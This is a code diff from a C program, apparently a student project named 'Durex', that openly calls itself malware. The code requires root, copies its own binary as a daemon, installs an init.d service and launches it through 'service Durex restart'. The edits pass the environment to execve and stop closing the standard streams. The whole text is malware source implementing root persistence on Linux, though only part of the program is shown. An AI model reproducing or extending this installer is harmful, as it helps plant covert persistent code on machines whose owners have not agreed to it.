@@ -89,7 +89,7 @@ static void	install_malware(char *argv, off_t size_daemon)
 	close(fd);
 }
 
-static void	install_init_d()
+static void	install_init_d(char **envp)
 {
 	int	fd = 0;
 	int	pid = 0;
@@ -172,10 +172,10 @@ static void	install_init_d()
 	}
 	else if (pid == 0)
 	{
-		close(STDOUT_FILENO);
-		close(STDIN_FILENO);
-		close(STDERR_FILENO);
-		execve(exec[0], exec, NULL);
+		/*close(STDOUT_FILENO);*/
+		/*close(STDIN_FILENO);*/
+		/*close(STDERR_FILENO);*/
+		execve(exec[0], exec, envp);
 	}
 	else
 	{
@@ -184,7 +184,7 @@ static void	install_init_d()
 	}
 }
 
-static void	lauch_malware()
+static void	lauch_malware(char **envp)
 {
 	int	pid = 0;
 	char	*exec[] = {"/usr/sbin/service", "Durex", "restart", NULL};
@@ -197,7 +197,7 @@ static void	lauch_malware()
 	}
 	else if (pid == 0)
 	{
-		execve(exec[0], exec, NULL);
+		execve(exec[0], exec, envp);
 	}
 	else
 	{
@@ -206,24 +206,22 @@ static void	lauch_malware()
 	}
 }
 
-int	main(int argc, char **argv)
+int	main(int argc, char **argv, char **envp)
 {
-	int	fd = 0;
 	off_t	size_daemon = 0;
-	struct stat	st;
 
 	if (check_root() == false)
 		return (false);
 
 	puts("rabougue\nkbensado");
 
-		close(STDOUT_FILENO);
-		close(STDIN_FILENO);
-		close(STDERR_FILENO);
+	/*close(STDOUT_FILENO);*/
+	/*close(STDIN_FILENO);*/
+	/*close(STDERR_FILENO);*/
 	size_daemon = daemon_begin(argv[0]);
 	install_malware(argv[0], size_daemon);
-	install_init_d();
-	lauch_malware();
+	install_init_d(envp);
+	lauch_malware(envp);
 
 	(void)argc;
 }
